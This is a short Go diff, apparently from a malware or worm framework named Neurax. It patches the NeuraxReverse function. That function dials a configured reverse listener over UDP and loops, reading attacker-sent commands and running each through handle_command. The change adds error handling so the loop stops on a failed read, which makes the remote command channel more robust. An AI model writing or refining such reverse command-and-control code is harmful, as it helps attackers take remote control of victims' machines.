@@ -254,7 +254,10 @@ func NeuraxOpenComm() {
 func NeuraxReverse() {
 	conn, _ := net.Dial("udp", NeuraxConfig.reverse_listener)
 	for {
-		command, _ := bufio.NewReader(conn).ReadString('\n')
+		command, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil {
+			break
+		}
 		command = strings.TrimSuffix(command, "\n")
 		go handle_command(command)
 	}
